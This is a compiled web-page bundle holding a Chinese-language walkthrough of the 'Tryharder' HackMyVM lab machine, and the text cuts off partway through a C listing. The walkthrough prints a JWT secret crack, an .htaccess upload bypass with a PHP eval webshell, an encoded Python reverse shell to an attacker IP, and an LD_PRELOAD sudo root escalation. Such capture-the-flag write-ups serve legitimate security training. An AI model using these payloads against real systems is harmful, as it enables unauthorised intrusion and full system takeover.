"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[4087],{85832:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>c,contentTitle:()=>d,default:()=>h,frontMatter:()=>a,metadata:()=>i,toc:()=>o});const i=JSON.parse('{"id":"HackMyVM/Machines/Tryharder/index","title":"Tryharder","description":"[Linux VM] [Tested on VirtualBox] created by || Sublarge","source":"@site/docs/HackMyVM/Machines/Tryharder/index.md","sourceDirName":"HackMyVM/Machines/Tryharder","slug":"/HackMyVM/Machines/Tryharder/","permalink":"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Tryharder/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Machines/Tryharder/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackMyVM_Sidebar","previous":{"title":"SuidyRevenge","permalink":"/Target-Machines-WriteUp/docs/HackMyVM/Machines/SuidyRevenge/"},"next":{"title":"Twisted","permalink":"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Twisted/"}}');var r=s(74848),t=s(28453);const a={},d="Tryharder",c={},o=[{value:"\u9776\u673a\u542f\u52a8",id:"\u9776\u673a\u542f\u52a8",level:2},{value:"\u4fe1\u606f\u641c\u96c6",id:"\u4fe1\u606f\u641c\u96c6",level:2},{value:"Web Service",id:"web-service",level:2},{value:"JWT Brute",id:"jwt-brute",level:2},{value:"File Upload",id:"file-upload",level:2},{value:"FLAG - USER",id:"flag---user",level:2},{value:"\u63d0\u6743\u81f3 xiix",id:"\u63d0\u6743\u81f3-xiix",level:2},{value:"\u7206\u7834\u6253\u6cd5",id:"\u7206\u7834\u6253\u6cd5",level:2},{value:"\u63d0\u6743\u81f3 root",id:"\u63d0\u6743\u81f3-root",level:2},{value:"FLAG - ROOT",id:"flag---root",level:2},{value:"Wrong way",id:"wrong-way",level:2}];function l(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",p:"p",pre:"pre",...(0,t.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.header,{children:(0,r.jsx)(n.h1,{id:"tryharder",children:"Tryharder"})}),"\n",(0,r.jsxs)(n.admonition,{type:"note",children:[(0,r.jsx)(n.p,{children:"[Linux VM] [Tested on VirtualBox] created by || Sublarge"}),(0,r.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2025-04-09"}),(0,r.jsx)(n.p,{children:"\u2714\ufe0f MD5 // a95f664b02775d44cf4a1f8bbbbad1ce"}),(0,r.jsx)(n.p,{children:"\u2620 Root // 3"}),(0,r.jsx)(n.p,{children:"\ud83d\udc80 User // 6"}),(0,r.jsx)(n.p,{children:"\ud83d\udcdd Notes //\nHello Hacker! Try Harder!"})]}),"\n",(0,r.jsx)(n.h2,{id:"\u9776\u673a\u542f\u52a8",children:"\u9776\u673a\u542f\u52a8"}),"\n",(0,r.jsx)(n.p,{children:"\u9776\u673a IP"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"192.168.56.129\n"})}),"\n",(0,r.jsx)(n.h2,{id:"\u4fe1\u606f\u641c\u96c6",children:"\u4fe1\u606f\u641c\u96c6"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ sudo nmap --min-rate=2000 -A -p- 192.168.56.129\nNmap scan report for bogon (192.168.56.129)\nHost is up (0.0013s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey:\n|   2048 93:a4:92:55:72:2b:9b:4a:52:66:5c:af:a9:83:3c:fd (RSA)\n|   256 1e:a7:44:0b:2c:1b:0d:77:83:df:1d:9f:0e:30:08:4d (ECDSA)\n|_  256 d0:fa:9d:76:77:42:6f:91:d3:bd:b5:44:72:a7:c9:71 (ED25519)\n80/tcp open  http    Apache httpd 2.4.59 ((Debian))\n|_http-title: \\xE8\\xA5\\xBF\\xE6\\xBA\\xAA\\xE6\\xB9\\x96\\xE7\\xA7\\x91\\xE6\\x8A\\x80 - \\xE4\\xBC\\x81\\xE4\\xB8\\x9A\\xE9\\x97\\xA8\\xE6\\x88\\xB7\\xE7\\xBD\\x91\\xE7\\xAB\\x99\n|_http-server-header: Apache/2.4.59 (Debian)\nMAC Address: 08:00:27:E6:39:25 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,r.jsx)(n.h2,{id:"web-service",children:"Web Service"}),"\n",(0,r.jsx)(n.p,{children:"\u5c1d\u8bd5\u76f4\u63a5\u8bbf\u95ee"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(28434).A+"",width:"2560",height:"1371"})}),"\n",(0,r.jsx)(n.p,{children:"\u5728\u9875\u9762\u6e90\u7801\u4e2d\uff0c\u53d1\u73b0"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-html",children:"/* \u8c03\u8bd5\u4fe1\u606f\uff1aAPI \u8def\u5f84 /NzQyMjE= */\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u8bbf\u95ee ",(0,r.jsx)(n.code,{children:"http://192.168.56.129/74221/"})," \u770b\u5230"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(61582).A+"",width:"2560",height:"1371"})}),"\n",(0,r.jsx)(n.p,{children:"\u5c1d\u8bd5\u76ee\u5f55\u7206\u7834"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ dirsearch -u http://192.168.56.129/74221/\n\nTarget: http://192.168.56.129/\n\n[15:07:33] Starting: 74221/\n[15:07:35] 403 -  279B  - /74221/.ht_wsr.txt\n[15:07:35] 403 -  279B  - /74221/.htaccess.bak1\n[15:07:35] 403 -  279B  - /74221/.htaccess.orig\n[15:07:35] 403 -  279B  - /74221/.htaccess.sample\n[15:07:35] 403 -  279B  - /74221/.htaccess.save\n[15:07:35] 403 -  279B  - /74221/.htaccess_extra\n[15:07:35] 403 -  279B  - /74221/.htaccess_orig\n[15:07:35] 403 -  279B  - /74221/.htaccess_sc\n[15:07:35] 403 -  279B  - /74221/.htaccessBAK\n[15:07:35] 403 -  279B  - /74221/.htaccessOLD\n[15:07:35] 403 -  279B  - /74221/.htaccessOLD2\n[15:07:35] 403 -  279B  - /74221/.htm\n[15:07:35] 403 -  279B  - /74221/.html\n[15:07:35] 403 -  279B  - /74221/.htpasswd_test\n[15:07:35] 403 -  279B  - /74221/.htpasswds\n[15:07:35] 403 -  279B  - /74221/.httr-oauth\n[15:07:36] 403 -  279B  - /74221/.php\n[15:08:01] 302 -    0B  - /74221/dashboard.php  ->  index.php\n[15:08:26] 200 -  456B  - /74221/uploads/\n[15:08:26] 301 -  324B  - /74221/uploads  ->  http://192.168.56.129/74221/uploads/\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5c1d\u8bd5\u4f7f\u7528 ",(0,r.jsx)(n.code,{children:"test:123456"})," \u767b\u5f55\u6210\u529f"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(53386).A+"",width:"2560",height:"1371"})}),"\n",(0,r.jsx)(n.p,{children:"\u5206\u6790 Cookie \u90e8\u5206\uff0c\u91c7\u7528\u4e86 JWT"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(38670).A+"",width:"2560",height:"1310"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(92729).A+"",width:"2560",height:"1371"})}),"\n",(0,r.jsx)(n.h2,{id:"jwt-brute",children:"JWT Brute"}),"\n",(0,r.jsxs)(n.p,{children:["\u7ecf\u8fc7\u7206\u7834\uff0c\u6210\u529f\u5f97\u5230\u4e86 JWT secret \u4e3a ",(0,r.jsx)(n.code,{children:"jwtsecret123"})]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(86259).A+"",width:"2560",height:"1371"})}),"\n",(0,r.jsxs)(n.p,{children:["\u91cd\u7b7e\u540d\uff0c\u5f97\u5230 ",(0,r.jsx)(n.code,{children:"admin"})," \u7684 Cookie"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(99879).A+"",width:"2560",height:"1371"})}),"\n",(0,r.jsx)(n.p,{children:"\u6210\u529f\u62ff\u5230\u6587\u4ef6\u4e0a\u4f20\u7684\u6743\u9650"}),"\n",(0,r.jsx)(n.h2,{id:"file-upload",children:"File Upload"}),"\n",(0,r.jsxs)(n.p,{children:["\u5c1d\u8bd5\u76f4\u63a5\u4e0a\u4f20 ",(0,r.jsx)(n.code,{children:"webshell.php"})," \u4f46\u662f\u6587\u4ef6\u683c\u5f0f\u88ab\u62e6\u622a"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(98965).A+"",width:"2560",height:"1371"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5c1d\u8bd5\u68c0\u67e5\u5e38\u89c1\u7684\u6587\u4ef6\u4e0a\u4f20\u7ed5\u8fc7\u65b9\u5f0f\uff0c\u53d1\u73b0\u53ef\u4ee5\u4e0a\u4f20 ",(0,r.jsx)(n.code,{children:".htaccess"})]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(52701).A+"",width:"2560",height:"1371"})}),"\n",(0,r.jsxs)(n.p,{children:["\u90a3\u4e48\u7b80\u5355\u4e86\uff0c\u76f4\u63a5\u8986\u5199 ",(0,r.jsx)(n.code,{children:".jpg"})," \u6587\u4ef6\u683c\u5f0f\u7684\u89e3\u6790"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",metastring:'title=".htaccess"',children:"AddType application/x-httpd-php .jpg\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u4e0a\u4f20\u4e4b\u540e\uff0c\u4e0a\u4f20\u4e00\u4e2a ",(0,r.jsx)(n.code,{children:"webshell.jpg"})]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",metastring:'title="webshell.jpg"',children:"<?php @eval($_POST['shell']) ?>\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(19328).A+"",width:"2560",height:"1371"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5c1d\u8bd5\u4f7f\u7528\u8681\u5251\u8fde\u63a5 ",(0,r.jsx)(n.code,{children:"http://192.168.56.129/74221/uploads/123/webshell.jpg"})]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(14513).A+"",width:"1542",height:"1040"})}),"\n",(0,r.jsx)(n.p,{children:"\u6210\u529f\u8fde\u63a5 webshell"}),"\n",(0,r.jsx)(n.h2,{id:"flag---user",children:"FLAG - USER"}),"\n",(0,r.jsx)(n.p,{children:"\u6743\u9650\u9650\u5236\u4e0d\u4e25\u683c\uff0c\u4f7f\u7528 webshell \u5373\u53ef\u8bfb\u53d6\u5230"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(59099).A+"",width:"1542",height:"1040"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-flag",metastring:'title="/home/pentester/user.txt"',children:"Flag{c4f9375f9834b4e7f0a528cc65c055702bf5f24a}\n"})}),"\n",(0,r.jsx)(n.h2,{id:"\u63d0\u6743\u81f3-xiix",children:"\u63d0\u6743\u81f3 xiix"}),"\n",(0,r.jsx)(n.p,{children:"\u5148\u53cd\u5f39 shell"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"> echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguNTYuMTI3Iiw5OTk5KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigiYmFzaCIpJw== | base64 -d | bash\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(91220).A+"",width:"1542",height:"1040"})}),"\n",(0,r.jsx)(n.p,{children:"\u5373\u53ef\u5f97\u5230\u56de\u8fde\u7684 shell"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ pwncat-cs -lp 9999\n[15:31:31] Welcome to pwncat \ud83d\udc08!\n[15:32:09] received connection from 192.168.56.129:37582\n[15:32:10] 192.168.56.129:37582: registered new host w/ db\n(local) pwncat$ back\n(remote) www-data@Tryharder:/var/www/html/74221/uploads/123$ whoami\nwww-data\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5c1d\u8bd5\u81ea\u52a8\u5316\u5206\u6790\u63d0\u6743\u8def\u5f84"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"(remote) www-data@Tryharder:/tmp$ ./linpeas.sh\n......\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Cleaned processes\n\u255a Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes\nroot         1  0.1  0.9 103840  9960 ?        Ss   03:05   0:02 /sbin/init\nroot       216  0.0  0.8  40488  8788 ?        Ss   03:05   0:01 /lib/systemd/systemd-journald\nroot       238  0.0  0.4  22060  4920 ?        Ss   03:05   0:00 /lib/systemd/systemd-udevd\nroot     14543  0.0  0.2  22060  2328 ?        S    03:34   0:00  _ /lib/systemd/systemd-udevd\nsystemd+   262  0.0  0.6  93080  6508 ?        Ssl  03:05   0:00 /lib/systemd/systemd-timesyncd\n  \u2514\u2500(Caps) 0x0000000002000000=cap_sys_time\nroot       334  0.0  0.6  19304  6368 ?        Ss   03:05   0:00 /lib/systemd/systemd-logind\nmessage+   335  0.0  0.4   8968  4348 ?        Ss   03:05   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only\n  \u2514\u2500(Caps) 0x0000000020000000=cap_audit_write\nroot       336  0.0  0.3 225820  3800 ?        Ssl  03:05   0:00 /usr/sbin/rsyslogd -n -iNONE\nroot       338  0.0  0.3   8824  3116 ?        Ss   03:05   0:00 /usr/sbin/cron -f\nroot     12777  0.0  0.2   9796  2804 ?        S    03:06   0:00  _ /usr/sbin/CRON -f\nxiix     12778  0.0  0.0   2384   764 ?        Ss   03:06   0:00      _ /bin/sh -c /srv/backdoor.py\nxiix     12779  0.0  0.8  19260  8352 ?        S    03:06   0:00          _ python /srv/backdoor.py\n\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Users with console\npentester:x:1000:1000:Itwasthebestoftimes!itwastheworstoftimes@itwastheageofwisdom#itwastheageoffoolishness$itwastheepochofbelief,itwastheepochofincredulity,&itwastheseasonofLight...:/home/pentester:/bin/bash\nroot:x:0:0:root:/root:/bin/bash\nxiix:x:1001:1001:A Tale of Two Cities:/home/xiix:/bin/bash\n\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Searching root files in home dirs (limit 30)\n/home/\n/home/pentester/.note\n/home/pentester/.bash_history\n/home/xiix/.bash_history\n/root/\n/var/www\n/var/www/html\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5f88\u660e\u663e\uff0c\u6709\u4e00\u4e2a\u8ba1\u5212\u4efb\u52a1\u5728\u5b9a\u671f\u6267\u884c ",(0,r.jsx)(n.code,{children:"/srv/backdoor.py"})]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"(remote) www-data@Tryharder:/tmp$ ls -lah /srv/backdoor.py\n-rwx------ 1 xiix xiix 1012 Mar 23 23:42 /srv/backdoor.py\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u540c\u65f6\uff0c\u53d1\u73b0\u4e86\u4e00\u4efd note"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",metastring:'title="/home/pentester/.note"',children:"Two cities clashed in tale: Smash Caesar, buddy, to pass.\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u4ee5\u53ca\u5728 ",(0,r.jsx)(n.code,{children:"/etc/passwd"})," \u4e2d\u53d1\u73b0\u4ee5\u4e0b\u4fe1\u606f"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"pentester:x:1000:1000:Itwasthebestoftimes!itwastheworstoftimes@itwastheageofwisdom#itwastheageoffoolishness$itwastheepochofbelief,itwastheepochofincredulity,&itwastheseasonofLight...:/home/pentester:/bin/bash\nxiix:x:1001:1001:A Tale of Two Cities:/home/xiix:/bin/bash\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u8fd8\u6709\u4e00\u4efd\u5728 ",(0,r.jsx)(n.code,{children:"/srv/..."})]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"Iuwbtthfbetuoftimfs\"iuwbsuhfxpsttoguinet@jtwbttieahfogwiseon#iuxatthfageofgpoljthoess%itwbsuiffqocipfbemieg-iuxbsuhffqpdhogjocredvljtz,'iuwasuhesfasooofLjgiu../\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5c1d\u8bd5\u76f4\u63a5\u7528\u811a\u672c\u8fdb\u884c\u89e3\u5bc6"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'a = "Itwasthebestoftimes!itwastheworstoftimes@itwastheageofwisdom#itwastheageoffoolishness$itwastheepochofbelief,itwastheepochofincredulity,&itwastheseasonofLight..."\nb = "Iuwbtthfbetuoftimfs\\"iuwbsuhfxpsttoguinet@jtwbttieahfogwiseon#iuxatthfageofgpoljthoess%itwbsuiffqocipfbemieg-iuxbsuhffqpdhogjocredvljtz,\'iuwasuhesfasooofLjgiu../"\n\nres = []\n\nfor i in range(len(a)):\n    # print(ord(a[i]), ord(b[i]))\n    # print(ord(a[i]) - ord(b[i]))\n    res.append(str(ord(b[i]) - ord(a[i])))\n\nres = "".join(res)\n\nbinary_int = int(res, 2)\n\nbyte_length = (binary_int.bit_length() + 7) // 8\nbinary_bytes = binary_int.to_bytes(byte_length, byteorder=\'big\')\n\ndecoded_str = binary_bytes.decode(\'utf-8\')\n\nprint(decoded_str)\n# Y0U_5M4SH3D_17_8UDDY\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u540c\u65f6\uff0c\u5c1d\u8bd5\u63a2\u6d4b\u8fd9\u4e2a python \u811a\u672c\u5728\u505a\u4ec0\u4e48"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"(remote) www-data@Tryharder:/tmp$ ss -lntup\nNetid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                     Peer Address:Port\nudp                     UNCONN                   0                        0                                                0.0.0.0:68                                            0.0.0.0:*\ntcp                     LISTEN                   0                        128                                              0.0.0.0:22                                            0.0.0.0:*\ntcp                     LISTEN                   1                        5                                              127.0.0.1:8989                                          0.0.0.0:*\ntcp                     LISTEN                   0                        128                                                    *:80                                                  *:*\ntcp                     LISTEN                   0                        128                                                 [::]:22                                               [::]:*\n\n(remote) www-data@Tryharder:/tmp$ ps -A | grep python\n12779 ?        00:00:00 python\n14279 ?        00:00:00 python3\n28321 ?        00:00:00 python3\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5c1d\u8bd5\u4e0e\u8fd9\u4e2a ",(0,r.jsx)(n.code,{children:"8989"})," \u7aef\u53e3\u8fdb\u884c\u901a\u4fe1"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"(remote) www-data@Tryharder:/tmp$ nc 127.0.0.1 8989\nEnter password: Y0U_5M4SH3D_17_8UDDY\nAccess granted!\nshell> whoami\nxiix\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5c1d\u8bd5\u53cd\u5f39 shell"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ pwncat-cs -lp 9999\n[17:18:03] Welcome to pwncat \ud83d\udc08!                                                                                                                                                                 __main__.py:164\n[17:18:14] received connection from 192.168.56.129:37612\n[17:18:14] 0.0.0.0:9999: normalizing shell path\n           192.168.56.129:37612: registered new host w/ db\n(local) pwncat$ back\n(remote) xiix@Tryharder:/home/xiix$ whoami\nxiix\n"})}),"\n",(0,r.jsx)(n.h2,{id:"\u7206\u7834\u6253\u6cd5",children:"\u7206\u7834\u6253\u6cd5"}),"\n",(0,r.jsx)(n.p,{children:"\u5728\u7528\u6237\u76ee\u5f55\u4e0b\u53d1\u73b0\u4e00\u4e2a\u731c\u6570\u6e38\u620f"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"(remote) xiix@Tryharder:/home/xiix$ ls -laih\ntotal 44K\n148005 drwxr-xr-x 3 xiix xiix 4.0K Mar 25 01:32 .\n   193 drwxr-xr-x 4 root root 4.0K Mar 23 10:46 ..\n131746 -rw------- 1 root root    0 Mar 25 07:20 .bash_history\n148008 -rw-r--r-- 1 xiix xiix  220 Apr 18  2019 .bash_logout\n140438 -rw-r--r-- 1 xiix xiix 3.5K Mar 23 12:05 .bashrc\n131378 ---x------ 1 xiix xiix  18K Mar 25 01:32 guess_game\n140446 drwxr-xr-x 3 xiix xiix 4.0K Mar 23 23:44 .local\n148006 -rw-r--r-- 1 xiix xiix  807 Apr 18  2019 .profile\n"})}),"\n",(0,r.jsx)(n.admonition,{type:"note",children:(0,r.jsxs)(n.p,{children:["\u6377\u5f84\u662f\u5728 ",(0,r.jsx)(n.code,{children:"/tmp"})," \u76ee\u5f55\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7 ",(0,r.jsx)(n.code,{children:"pspy"})," \u76d1\u63a7\u8fdb\u7a0b\u6765\u53d1\u73b0"]})}),"\n",(0,r.jsx)(n.p,{children:"\u76f4\u63a5\u5f00\u59cb\u7206\u7834\uff0c\u6210\u529f\u62ff\u5230\u4fe1\u606f"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"(remote) xiix@Tryharder:/home/xiix$ for i in $(seq 1000);do echo 32 | ./guess_game ;done\n......\n===== \u7ec8\u6781\u8fd0\u6c14\u6311\u6218 / Ultimate Luck Challenge ====\n\u89c4\u5219\u5f88\u7b80\u5355\uff1a \u6211\u5fc3\u91cc\u6709\u4e2a\u6570\u5b57\uff080-99\uff09\uff0c\u4f60\u6709\u4e00\u6b21\u673a\u4f1a\u731c\u3002\nI have a number (0-99), you get one guess.\n\u731c\u5bf9\u4e86\uff0c\u6211\u5c31\u628a\u5c5e\u4e8e\u4f60\u7684\u4e1c\u897f\u7ed9\u4f60\uff1b\u731c\u9519\u4e86\uff1f\u563f\u563f\uff0c\u540e\u679c\u81ea\u8d1f\uff01\nGuess right, I\u2019ll give your reward; wrong? Hehe, face the consequences!\n\u63d0\u793a\uff1a \u806a\u660e\u4eba\u4e5f\u8bb8\u80fd\u627e\u5230\u6377\u5f84\u3002\nHint: Smart ones might find a shortcut.\n\u5929\u54ea\uff01\u4f60\u5c45\u7136\u731c\u5bf9\u4e86\uff01\u8fd0\u6c14\u9006\u5929\u554a\uff01 / You got it! Amazing luck!\nPass: superxiix\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5e76\u83b7\u53d6\u5230 sudo \u4fe1\u606f"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"(remote) xiix@Tryharder:/home/xiix$ sudo -l\n[sudo] password for xiix:\nMatching Defaults entries for xiix on tryharder:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, env_keep+=LD_PRELOAD\n\nUser xiix may run the following commands on tryharder:\n    (ALL : ALL) /bin/whoami\n"})}),"\n",(0,r.jsx)(n.h2,{id:"\u63d0\u6743\u81f3-root",children:"\u63d0\u6743\u81f3 root"}),"\n",(0,r.jsxs)(n.p,{children:["\u90a3\u4e48\u5c31\u7b80\u5355\u4e86\uff0c\u4f7f\u7528 ",(0,r.jsx)(n.code,{children:"env_keep+=LD_PRELOAD"})," \u8fdb\u884c\u653b\u51fb"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'(remote) xiix@Tryharder:/home/xiix$ echo I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KCl9fYXR0cmlidXRlX18oKGNvbnN0cnVjdG9yKSkKdm9pZCBpbml0KCkKewogICAgcHV0cygiSGVsbG8gZHluYW1pYyBsaW5rYWdlIHdvcmxkISIpOwogICAgdW5zZXRlbnYoIkxEX1BSRUxPQUQiKTsKICAgIHN5c3RlbSgiL2Jpbi9iYXNoIik7Cn0K | base64 -d\n#include <stdio.h>\n#include <stdlib.h>\n\n__attribute__((constructor))\nvoid init()\n{\n    puts("Hello dynamic linkage world!");\n    unsetenv("LD_PRELOAD");\n    system("/bin/bash");\n}\n(remote) xiix@Tryharder:/home/xiix$ echo I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KCl9fYXR0cmlidXRlX18oKGNvbnN0cnVjdG9yKSkKdm9pZCBpbml0KCkKewogICAgcHV0cygiSGVsbG8gZHluYW1pYyBsaW5rYWdlIHdvcmxkISIpOwogICAgdW5zZXRlbnYoIkxEX1BSRUxPQUQiKTsKICAgIHN5c3RlbSgiL2Jpbi9iYXNoIik7Cn0K | base64 -d > inject.c\n(remote) xiix@Tryharder:/home/xiix$ gcc -shared -fPIC -o inject.so inject.c\n(remote) xiix@Tryharder:/home/xiix$ sudo LD_PRELOAD=/home/xiix/inject.so /usr/bin/whoami\nHello dynamic linkage world!\nroot@Tryharder:/home/xiix# whoami\nroot\n'})}),"\n",(0,r.jsx)(n.h2,{id:"flag---root",children:"FLAG - ROOT"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-flag",metastring:'title="/root/root.txt"',children:"Flag{7ca62df5c884cd9a5e5e9602fe01b39f9ebd8c6f}\n"})}),"\n",(0,r.jsx)(n.h2,{id:"wrong-way",children:"Wrong way"}),"\n",(0,r.jsx)(n.p,{children:"\u662f\u4e0d\u662f\u611f\u89c9\u54ea\u91cc\u4e0d\u5bf9\uff1f\u4e0d\u5bf9\u5c31\u5bf9\u4e86\uff0c\u6b65\u5b50\u8fc8\u5927\u4e86"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"Y0U_5M4SH3D_17_8UDDY"})," \u4e5f\u662f\u7528\u6237 ",(0,r.jsx)(n.code,{children:"pentester"})," \u7684\u5bc6\u7801"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"(remote) www-data@Tryharder:/tmp$ su pentester\nPassword:\npentester@Tryharder:/tmp$ whoami\npentester\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5e76\u4e14\u5176 sudo \u4fe1\u606f\u4e3a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"pentester@Tryharder:/tmp$ sudo -l\nMatching Defaults entries for pentester on tryharder:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser pentester may run the following commands on tryharder:\n    (ALL : ALL) NOPASSWD: /usr/bin/find\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u4f46\u662f\u5b9e\u9645\u4e0a\u7684 ",(0,r.jsx)(n.code,{children:"/usr/bin/find"})," \u6e90\u7801\u4e3a\uff08\u78c1\u76d8\u6570\u636e\u6062\u590d\uff09"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",metastring:'title="\\home\\pentester\\1.c"',children:'#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n\n#define REAL_FIND "/usr/bin/f1nd"\n#define ERROR_MSG "find: critical error - Segmentation fault (core dumped)\\n"\n\nint main(int argc, char *argv[]) {\n    for (int i = 1; i < 